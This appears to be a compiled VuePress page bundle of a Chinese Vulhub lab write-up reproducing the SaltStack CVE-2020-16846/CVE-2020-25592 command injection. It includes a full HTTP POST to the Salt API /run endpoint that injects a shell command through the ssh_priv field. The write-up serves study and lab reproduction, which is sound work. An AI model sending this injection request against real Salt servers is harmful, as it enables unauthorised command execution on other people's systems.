import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as s,c as l,a as e,b as a,d as c,e as r}from"./app-58e4a7d6.js";const o={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"SaltStack 是基于 Python 开发的一套C/S架构配置管理工具。2020年11月SaltStack官方披露了CVE-2020-16846和CVE-2020-25592两个漏洞，其中CVE-2020-25592允许任意用户调用SSH模块，CVE-2020-16846允许用户执行任意命令。组合这两个漏洞，将可以使未授权的攻击者通过Salt API执行任意命令。",-1),u=e("p",null,"参考链接：",-1),m={href:"https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag",target:"_blank",rel:"noopener noreferrer"},h=r(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个SaltStack Master服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，将会在本地监听如下端口：</p><ul><li>4505/4506 这是SaltStack Master与minions通信的端口</li><li>8000 这是Salt的API端口，<strong>需要通过https访问</strong></li><li>2222 这是容器内部的SSH服务器监听的端口</li></ul><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>向<code>https://your-ip:8000/run</code>发送如下数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /run HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/x-yaml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

token=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=aaa|touch%20/tmp/awesome_poc%3b
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202282013907.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过<code>ssh_priv</code>位置注入命令<code>touch /tmp/awesome_poc</code>，进入容器可见已执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202282013086.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11);function v(_,g){const n=t("ExternalLinkIcon");return s(),l("div",null,[d,p,u,e("ul",null,[e("li",null,[e("a",m,[a("https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag"),c(n)])])]),h])}const S=i(o,[["render",v],["__file","SaltStack 命令注入漏洞 CVE-2020-16846.html.vue"]]);export{S as default};
